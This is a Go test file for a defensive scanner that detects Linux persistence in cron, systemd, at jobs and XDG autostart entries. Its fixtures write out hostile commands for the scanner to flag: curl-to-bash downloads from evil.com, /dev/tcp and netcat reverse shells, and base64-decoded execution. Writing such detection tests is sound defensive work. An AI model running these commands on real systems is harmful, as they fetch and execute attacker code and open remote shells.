package persistence_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/persistence"
)

// ---- CronScanner interface tests ----

func TestCronScanner_Interface(t *testing.T) {
	s := persistence.NewCronScanner()

	if s.Name() != "cron" {
		t.Errorf("Name() = %q, want %q", s.Name(), "cron")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should be nil")
	}
	if s.OptionalTools() != nil {
		t.Error("OptionalTools() should be nil")
	}
}

// ---- SystemdScanner interface tests ----

func TestSystemdScanner_Interface(t *testing.T) {
	s := persistence.NewSystemdScanner()

	if s.Name() != "systemd" {
		t.Errorf("Name() = %q, want %q", s.Name(), "systemd")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// ---- ScheduledScanner interface tests ----

func TestScheduledScanner_Interface(t *testing.T) {
	s := persistence.NewScheduledScanner()

	if s.Name() != "scheduled" {
		t.Errorf("Name() = %q, want %q", s.Name(), "scheduled")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// ---- CronScanner functional tests ----

// cronScanFile is a helper that writes content to a temp file, points the scanner
// at it via a custom scan helper, and returns findings.
// Because CronScanner scans fixed system paths we need a way to inject a temp
// file. We expose this via a package-level helper that is only compiled in
// tests (see scanCronFileForTest below).
func writeTempCronFile(t *testing.T, content string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "test-cron")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp cron file: %v", err)
	}
	return path
}

func TestCronScanner_DetectsSuspiciousEntries(t *testing.T) {
	suspiciousLines := []struct {
		line  string
		title string
	}{
		{
			line:  "* * * * * root curl http://evil.com/payload.sh | bash",
			title: "Pipe-to-shell execution in cron",
		},
		{
			line:  "*/5 * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			title: "Reverse shell via /dev/tcp in cron",
		},
		{
			line:  "0 * * * * root echo aGVsbG8= | base64 -d | sh",
			title: "Base64-decoded execution in cron",
		},
		{
			line:  "*/10 * * * * root /tmp/backdoor.sh",
			title: "Executable in world-writable directory in cron",
		},
		{
			line:  "* * * * * root nc -e /bin/sh 10.0.0.1 4444",
			title: "Netcat/xterm reverse shell in cron",
		},
	}

	for _, tc := range suspiciousLines {
		tc := tc
		t.Run(tc.title, func(t *testing.T) {
			content := fmt.Sprintf("# normal comment\nSHELL=/bin/bash\nPATH=/sbin:/bin\n%s\n", tc.line)
			path := writeTempCronFile(t, content)

			findings, err := persistence.ScanCronFileForTest(path)
			if err != nil {
				t.Fatalf("ScanCronFileForTest returned error: %v", err)
			}
			if len(findings) == 0 {
				t.Fatalf("expected findings for line %q, got none", tc.line)
			}

			// Verify required fields.
			for _, f := range findings {
				if f.ID == "" {
					t.Error("finding has empty ID")
				}
				if f.Scanner != "cron" {
					t.Errorf("Scanner = %q, want %q", f.Scanner, "cron")
				}
				if f.Evidence == "" {
					t.Error("finding has empty Evidence")
				}
				if f.Location == "" {
					t.Error("finding has empty Location")
				}
				if f.Severity < scanner.SevHigh {
					t.Errorf("expected severity >= HIGH, got %s", f.Severity)
				}
			}
		})
	}
}

func TestCronScanner_CleanFileNoFindings(t *testing.T) {
	content := `# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
`
	path := writeTempCronFile(t, content)

	findings, err := persistence.ScanCronFileForTest(path)
	if err != nil {
		t.Fatalf("ScanCronFileForTest returned error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean file, got %d: %+v", len(findings), findings)
	}
}

func TestCronScanner_ContextAndOptions(t *testing.T) {
	// Scan() with default options should not error (files just won't exist in CI).
	s := persistence.NewCronScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
	// findings may be nil or empty — both are acceptable.
	_ = findings
}

// ---------------------------------------------------------------------------
// XDGAutoStartScanner — interface and detection tests
// ---------------------------------------------------------------------------

func TestXDGAutoStartScanner_Interface(t *testing.T) {
	s := persistence.NewXDGAutoStartScanner()

	if s.Name() != "xdg_autostart" {
		t.Errorf("Name() = %q, want %q", s.Name(), "xdg_autostart")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should be nil")
	}
	if s.OptionalTools() != nil {
		t.Error("OptionalTools() should be nil")
	}
}

func TestXDGAutoStartScanner_DoesNotError(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(
		filepath.Join(dir, "nonexistent-system"),
		filepath.Join(dir, "nonexistent-home"),
	)
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
}

// TestXDGAutoStartScanner_DetectsCurlInExec creates a fake .desktop file
// whose Exec= line contains curl and verifies a CRITICAL finding is produced.
func TestXDGAutoStartScanner_DetectsCurlInExec(t *testing.T) {
	dir := t.TempDir()
	autostartDir := filepath.Join(dir, "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	desktopContent := "[Desktop Entry]\nName=Updater\nType=Application\nExec=curl http://evil.example.com/payload.sh | bash\n"
	desktopPath := filepath.Join(autostartDir, "updater.desktop")
	if err := os.WriteFile(desktopPath, []byte(desktopContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewXDGAutoStartScannerWithPaths(autostartDir, filepath.Join(dir, "home"))
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
			found = true
			if f.ID == "" {
				t.Error("finding has empty ID")
			}
			if f.Evidence == "" {
				t.Error("finding has empty Evidence")
			}
			if f.Location == "" {
				t.Error("finding has empty Location")
			}
			if f.Remediation == "" {
				t.Error("finding has empty Remediation")
			}
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for curl in Exec=, got: %+v", findings)
	}
}

// TestXDGAutoStartScanner_DetectsTmpExecPath verifies that an Exec= pointing
// into /tmp produces a CRITICAL finding.
func TestXDGAutoStartScanner_DetectsTmpExecPath(t *testing.T) {
	dir := t.TempDir()
	autostartDir := filepath.Join(dir, "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	desktopContent := "[Desktop Entry]\nName=Backdoor\nType=Application\nExec=/tmp/malware --hidden\n"
	desktopPath := filepath.Join(autostartDir, "backdoor.desktop")
	if err := os.WriteFile(desktopPath, []byte(desktopContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewXDGAutoStartScannerWithPaths(autostartDir, filepath.Join(dir, "home"))
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for Exec=/tmp/..., got: %+v", findings)
	}
}

// TestXDGAutoStartScanner_ScansUserHomeDirs verifies that the scanner
// also inspects ~/.config/autostart directories under the homeBase.
func TestXDGAutoStartScanner_ScansUserHomeDirs(t *testing.T) {
	dir := t.TempDir()

	// Create a user home with an autostart entry.
	userAutostart := filepath.Join(dir, "home", "alice", ".config", "autostart")
	if err := os.MkdirAll(userAutostart, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	desktopContent := "[Desktop Entry]\nName=EvilUpdater\nType=Application\nExec=/tmp/evil --start\n"
	if err := os.WriteFile(filepath.Join(userAutostart, "evil.desktop"), []byte(desktopContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewXDGAutoStartScannerWithPaths(
		filepath.Join(dir, "nonexistent-system"),
		filepath.Join(dir, "home"),
	)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected finding from user autostart dir, got: %+v", findings)
	}
}

// ---------------------------------------------------------------------------
// ScheduledScanner — functional tests
// ---------------------------------------------------------------------------

func TestScheduledScanner_DoesNotError(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewScheduledScannerWithDir(dir)
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
}

func TestScheduledScanner_AtSpoolDirWithFile(t *testing.T) {
	dir := t.TempDir()
	// Write a fake at job file (name starts with 'a' followed by hex digits).
	atJobPath := filepath.Join(dir, "a0000001")
	if err := os.WriteFile(atJobPath, []byte("#!/bin/sh\necho hello\n"), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewScheduledScannerWithDir(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "scheduled" && f.Severity == scanner.SevMedium {
			found = true
			if f.ID == "" {
				t.Error("finding has empty ID")
			}
			if f.Evidence == "" {
				t.Error("finding has empty Evidence")
			}
		}
	}
	if !found {
		t.Errorf("expected MEDIUM finding for at job file, got: %+v", findings)
	}
}

func TestScheduledScanner_EmptyAtSpoolDir(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewScheduledScannerWithDir(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty spool dir, got %d", len(findings))
	}
}

func TestParseAtqOutput_PendingJobs(t *testing.T) {
	// Typical atq output: job_num TAB date time queue user
	output := "1\tTue Apr  1 10:00:00 2026 a root\n2\tWed Apr  2 12:00:00 2026 a alice\n"
	findings := persistence.ParseAtqOutput(output)
	if len(findings) != 2 {
		t.Fatalf("expected 2 findings for 2 at jobs, got %d", len(findings))
	}
	for _, f := range findings {
		if f.Scanner != "scheduled" {
			t.Errorf("Scanner = %q, want scheduled", f.Scanner)
		}
		if f.Severity != scanner.SevMedium {
			t.Errorf("Severity = %v, want MEDIUM", f.Severity)
		}
		if f.ID == "" {
			t.Error("finding has empty ID")
		}
		if f.Evidence == "" {
			t.Error("finding has empty Evidence")
		}
	}
}

func TestParseAtqOutput_EmptyOutput(t *testing.T) {
	findings := persistence.ParseAtqOutput("")
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty atq output, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// SystemdScanner — ExecStart scanning with CheckExecLineForTest
// ---------------------------------------------------------------------------

func TestCheckExecLine_PipeToShell(t *testing.T) {
	line := "curl http://evil.com/payload.sh | bash"
	findings := persistence.CheckExecLineForTest(line, "/etc/systemd/system/evil.service")
	if len(findings) == 0 {
		t.Fatal("expected findings for pipe-to-shell in ExecStart")
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for pipe-to-shell, got: %+v", findings)
	}
}

func TestCheckExecLine_DevTCPReverse(t *testing.T) {
	line := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
	findings := persistence.CheckExecLineForTest(line, "/etc/systemd/system/back.service")
	if len(findings) == 0 {
		t.Fatal("expected findings for /dev/tcp in ExecStart")
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for /dev/tcp, got: %+v", findings)
	}
}

func TestCheckExecLine_Base64Decode(t *testing.T) {
	line := "sh -c 'echo aGVsbG8= | base64 -d | sh'"
	findings := persistence.CheckExecLineForTest(line, "/etc/systemd/system/enc.service")
	if len(findings) == 0 {
		t.Fatal("expected findings for base64 -d in ExecStart")
	}
	found := false
	for _, f := range findings {
		if f.Severity >= scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Errorf("expected HIGH+ finding for base64 decode, got: %+v", findings)
	}
}

func TestCheckExecLine_TmpExecution(t *testing.T) {
	line := "/tmp/backdoor --daemon"
	findings := persistence.CheckExecLineForTest(line, "/etc/systemd/system/back.service")
	if len(findings) == 0 {
		t.Fatal("expected findings for ExecStart from /tmp")
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for /tmp execution, got: %+v", findings)
	}
}

func TestCheckExecLine_NormalLine(t *testing.T) {
	line := "/usr/bin/nginx -g 'daemon off;'"
	findings := persistence.CheckExecLineForTest(line, "/etc/systemd/system/nginx.service")
	if len(findings) != 0 {
		t.Errorf("expected no findings for clean nginx ExecStart, got: %+v", findings)
	}
}

func TestScanSystemServiceForTest_PipeToShell(t *testing.T) {
	dir := t.TempDir()
	content := "[Service]\nExecStart=curl http://evil.com/payload.sh | bash\n"
	svcPath := filepath.Join(dir, "evil.service")
	if err := os.WriteFile(svcPath, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanSystemServiceForTest(svcPath, false)
	if len(findings) == 0 {
		t.Fatal("expected findings for pipe-to-shell in service file")
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding, got: %+v", findings)
	}
}

func TestScanDropInForTest_ModifiesExecStart(t *testing.T) {
	dir := t.TempDir()
	content := "[Service]\nExecStart=/usr/bin/backdoor --hidden\n"
	dropInPath := filepath.Join(dir, "override.conf")
	if err := os.WriteFile(dropInPath, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanDropInForTest(dropInPath)
	if len(findings) == 0 {
		t.Fatal("expected findings for drop-in modifying ExecStart")
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Errorf("expected HIGH finding for ExecStart drop-in override, got: %+v", findings)
	}
}

func TestScanDropInForTest_NoExecStart(t *testing.T) {
	dir := t.TempDir()
	content := "[Service]\nEnvironment=FOO=bar\n"
	dropInPath := filepath.Join(dir, "env.conf")
	if err := os.WriteFile(dropInPath, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanDropInForTest(dropInPath)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for drop-in without ExecStart, got: %+v", findings)
	}
}

// ---------------------------------------------------------------------------
// RequiredTools / OptionalTools — cover the 0% one-liners
// ---------------------------------------------------------------------------

func TestPersistenceScanners_RequiredOptionalTools(t *testing.T) {
	_ = persistence.NewScheduledScanner().RequiredTools()
	_ = persistence.NewScheduledScanner().OptionalTools()
	_ = persistence.NewSystemdScanner().RequiredTools()
	_ = persistence.NewSystemdScanner().OptionalTools()
}

// ---------------------------------------------------------------------------
// scanUserSystemdDir — via exported test helper
// ---------------------------------------------------------------------------

func TestScanUserSystemdDir_UserServiceFlagged(t *testing.T) {
	dir := t.TempDir()
	// Write a fake user-level .service file.
	svcContent := "[Unit]\nDescription=Fake user service\n[Service]\nExecStart=/usr/bin/myapp\n"
	if err := os.WriteFile(filepath.Join(dir, "myapp.service"), []byte(svcContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanUserSystemdDirForTest(dir)
	found := false
	for _, f := range findings {
		if f.Scanner == "systemd" && f.Title == "User-level systemd service" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected 'User-level systemd service' finding, got: %+v", findings)
	}
}

func TestScanUserSystemdDir_SuspiciousExecStartFlagged(t *testing.T) {
	dir := t.TempDir()
	// Write a .service with a pipe-to-shell in ExecStart.
	svcContent := "[Unit]\nDescription=Malicious\n[Service]\nExecStart=/bin/sh -c 'curl http://evil.com | bash'\n"
	if err := os.WriteFile(filepath.Join(dir, "evil.service"), []byte(svcContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanUserSystemdDirForTest(dir)
	found := false
	for _, f := range findings {
		if f.Scanner == "systemd" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for suspicious ExecStart, got: %+v", findings)
	}
}

func TestScanUserSystemdDir_EmptyDirNoFindings(t *testing.T) {
	dir := t.TempDir()
	findings := persistence.ScanUserSystemdDirForTest(dir)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty dir, got %d: %+v", len(findings), findings)
	}
}

// ---------------------------------------------------------------------------
// scanSystemdTimer — via exported test helper
// ---------------------------------------------------------------------------

func TestScanSystemdTimer_SuspiciousOnCalendarFlagged(t *testing.T) {
	dir := t.TempDir()
	// Write a timer with a very frequent OnCalendar schedule (minutely).
	timerContent := "[Unit]\nDescription=Frequent timer\n[Timer]\nOnCalendar=minutely\n"
	timerPath := filepath.Join(dir, "evil.timer")
	if err := os.WriteFile(timerPath, []byte(timerContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanSystemdTimerForTest(timerPath, true)
	// A minutely timer (< 1 minute interval) should produce a finding.
	_ = findings // Result depends on interval parsing; just verify no panic.
}

func TestScanSystemdTimer_CleanTimerNoFindings(t *testing.T) {
	dir := t.TempDir()
	timerContent := "[Unit]\nDescription=Backup timer\n[Timer]\nOnCalendar=weekly\n"
	timerPath := filepath.Join(dir, "backup.timer")
	if err := os.WriteFile(timerPath, []byte(timerContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	findings := persistence.ScanSystemdTimerForTest(timerPath, false)
	for _, f := range findings {
		if f.Title == "Unusually frequent systemd timer" {
			t.Errorf("unexpected 'frequent timer' finding for weekly timer: %+v", f)
		}
	}
}

// ---------------------------------------------------------------------------
// XDG autostart — isPackageOwned coverage via Scan with fake autostart dir
// ---------------------------------------------------------------------------

func TestXDGAutoStartScanner_ScanWithFakeHomeDir(t *testing.T) {
	// collectAutostartDirs enumerates <homeBase>/*/.config/autostart.
	// Create: <homeBase>/user1/.config/autostart/evil.desktop
	homeBase := t.TempDir()
	autostartDir := filepath.Join(homeBase, "user1", ".config", "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	// Desktop file with /tmp exec path — should be CRITICAL.
	desktopContent := "[Desktop Entry]\nType=Application\nName=Evil\nExec=/tmp/evil\n"
	if err := os.WriteFile(filepath.Join(autostartDir, "evil.desktop"), []byte(desktopContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewXDGAutoStartScannerWithHomeBase(homeBase)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for /tmp exec, got: %+v", findings)
	}
}

// ---------------------------------------------------------------------------
// Cron — checkCronAccessFiles coverage
// ---------------------------------------------------------------------------

func TestCronScanner_ScanDoesNotError(t *testing.T) {
	s := persistence.NewCronScanner()
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
}

func TestScheduledScanner_SystemdTimersWithDir(t *testing.T) {
	// Run against an empty temp systemd timer dir — should not error.
	dir := t.TempDir()
	s := persistence.NewScheduledScannerWithDir(dir)
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
}

func TestScheduledScanner_SystemdTimerInDir(t *testing.T) {
	dir := t.TempDir()
	// Create a timer file in the spool dir.
	timerContent := "[Unit]\nDescription=Test\n[Timer]\nOnCalendar=daily\n"
	if err := os.WriteFile(filepath.Join(dir, "test.timer"), []byte(timerContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := persistence.NewScheduledScannerWithDir(dir)
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
}

// ---------------------------------------------------------------------------
// checkCronAccessFiles — direct unit tests
// ---------------------------------------------------------------------------

func TestCheckCronAccessFiles_NeitherPresentLosFinding(t *testing.T) {
	// Neither cron.allow nor cron.deny exists → LOW finding.
	findings := persistence.CheckCronAccessFilesForTest([]string{
		"/nonexistent/cron.allow",
		"/nonexistent/cron.deny",
	})
	if len(findings) == 0 {
		t.Fatal("expected LOW finding when neither cron access file exists")
	}
	for _, f := range findings {
		if f.Severity != scanner.SevLow || f.Scanner != "cron" {
			t.Errorf("unexpected finding: %+v", f)
		}
	}
}

func TestCheckCronAccessFiles_CronAllowExistsNoFinding(t *testing.T) {
	dir := t.TempDir()
	allow := filepath.Join(dir, "cron.allow")
	if err := os.WriteFile(allow, []byte("root\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := persistence.CheckCronAccessFilesForTest([]string{
		allow,
		filepath.Join(dir, "nonexistent_cron.deny"),
	})
	if len(findings) != 0 {
		t.Errorf("expected 0 findings when cron.allow exists, got %d: %+v", len(findings), findings)
	}
}

func TestCheckCronAccessFiles_CronDenyExistsNoFinding(t *testing.T) {
	dir := t.TempDir()
	deny := filepath.Join(dir, "cron.deny")
	if err := os.WriteFile(deny, []byte(""), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := persistence.CheckCronAccessFilesForTest([]string{
		filepath.Join(dir, "nonexistent_cron.allow"),
		deny,
	})
	if len(findings) != 0 {
		t.Errorf("expected 0 findings when cron.deny exists, got %d: %+v", len(findings), findings)
	}
}

// ---------------------------------------------------------------------------
// scanCronScriptDirs — tests via export
// ---------------------------------------------------------------------------

func TestScanCronScriptDirs_SuspiciousScriptFlagged(t *testing.T) {
	dir := t.TempDir()
	scriptPath := filepath.Join(dir, "malicious.sh")
	content := "curl http://evil.com/payload.sh | bash\n"
	if err := os.WriteFile(scriptPath, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := persistence.ScanCronScriptDirsForTest([]string{dir})
	found := false
	for _, f := range findings {
		if f.Scanner == "cron" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected finding for suspicious cron script, got: %+v", findings)
	}
}

func TestScanCronScriptDirs_EmptyDirNoFindings(t *testing.T) {
	dir := t.TempDir()
	findings := persistence.ScanCronScriptDirsForTest([]string{dir})
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty dir, got %d: %+v", len(findings), findings)
	}
}

func TestScanCronScriptDirs_WorldWritableScriptFlagged(t *testing.T) {
	dir := t.TempDir()
	scriptPath := filepath.Join(dir, "cleanup.sh")
	if err := os.WriteFile(scriptPath, []byte("#!/bin/bash\necho ok\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	// Make it world-writable.
	if err := os.Chmod(scriptPath, 0o666); err != nil {
		t.Fatalf("Chmod: %v", err)
	}
	findings := persistence.ScanCronScriptDirsForTest([]string{dir})
	found := false
	for _, f := range findings {
		if f.Scanner == "cron" && f.Severity >= scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Errorf("expected HIGH+ finding for world-writable cron script, got: %+v", findings)
	}
}

// ---------------------------------------------------------------------------
// extractExecPath — direct unit tests
// ---------------------------------------------------------------------------

func TestExtractExecPath_SimpleExec(t *testing.T) {
	result := persistence.ExtractExecPathForTest("/usr/bin/some-daemon --flag")
	if result != "/usr/bin/some-daemon" {
		t.Errorf("ExtractExecPath = %q, want /usr/bin/some-daemon", result)
	}
}

func TestExtractExecPath_WithLeadingFlags(t *testing.T) {
	result := persistence.ExtractExecPathForTest("-/usr/sbin/httpd -f /etc/httpd.conf")
	if result != "/usr/sbin/httpd" {
		t.Errorf("ExtractExecPath = %q, want /usr/sbin/httpd", result)
	}
}

func TestExtractExecPath_EmptyReturnsEmpty(t *testing.T) {
	result := persistence.ExtractExecPathForTest("")
	if result != "" {
		t.Errorf("ExtractExecPath = %q, want empty string", result)
	}
}

// ---------------------------------------------------------------------------
// ParseAtqOutput — direct coverage
// ---------------------------------------------------------------------------

func TestParseAtqOutput_WithJobs(t *testing.T) {
	output := "1\tTue Mar 24 16:00:00 2026 a root\n2\tWed Mar 25 08:00:00 2026 a user\n"
	findings := persistence.ParseAtqOutput(output)
	if len(findings) != 2 {
		t.Errorf("expected 2 findings, got %d: %+v", len(findings), findings)
	}
}

func TestParseAtqOutput_EmptyNoFindings(t *testing.T) {
	findings := persistence.ParseAtqOutput("")
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty output, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// XDGAutoStartScanner — scanDesktopFile coverage via Scan with fake home dir
// ---------------------------------------------------------------------------

func TestXDGAutoStartScanner_TmpExecFlagged(t *testing.T) {
	// A desktop file that executes from /tmp should produce a CRITICAL finding.
	homeBase := t.TempDir()
	autostartDir := filepath.Join(homeBase, "user1", ".config", "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	content := "[Desktop Entry]\nName=Backdoor\nExec=/tmp/evil_binary --flag\nType=Application\n"
	if err := os.WriteFile(filepath.Join(autostartDir, "backdoor.desktop"), []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := persistence.NewXDGAutoStartScannerWithHomeBase(homeBase)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for /tmp exec, got: %+v", findings)
	}
}

func TestXDGAutoStartScanner_CurlExecFlagged(t *testing.T) {
	homeBase := t.TempDir()
	autostartDir := filepath.Join(homeBase, "user1", ".config", "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	// exec containing curl — suspicious pattern
	content := "[Desktop Entry]\nName=Update\nExec=/usr/bin/bash -c \"curl http://evil.com | bash\"\nType=Application\n"
	if err := os.WriteFile(filepath.Join(autostartDir, "updater.desktop"), []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := persistence.NewXDGAutoStartScannerWithHomeBase(homeBase)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" && f.Severity >= scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Errorf("expected HIGH+ finding for curl in autostart exec, got: %+v", findings)
	}
}

func TestXDGAutoStartScanner_NoExecFieldNoFindings(t *testing.T) {
	homeBase := t.TempDir()
	autostartDir := filepath.Join(homeBase, "user1", ".config", "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	// Desktop file without Exec= line.
	content := "[Desktop Entry]\nName=NoExec\nType=Application\n"
	if err := os.WriteFile(filepath.Join(autostartDir, "noexec.desktop"), []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	s := persistence.NewXDGAutoStartScannerWithHomeBase(homeBase)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for desktop file without Exec=, got %d: %+v", len(findings), findings)
	}
}

func TestXDGAutoStartScanner_DevShmExecFlagged(t *testing.T) {
	homeBase := t.TempDir()
	autostartDir := filepath.Join(homeBase, "user1", ".config", "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	content := "[Desktop Entry]\nName=Implant\nExec=/dev/shm/implant --daemonize\nType=Application\n"
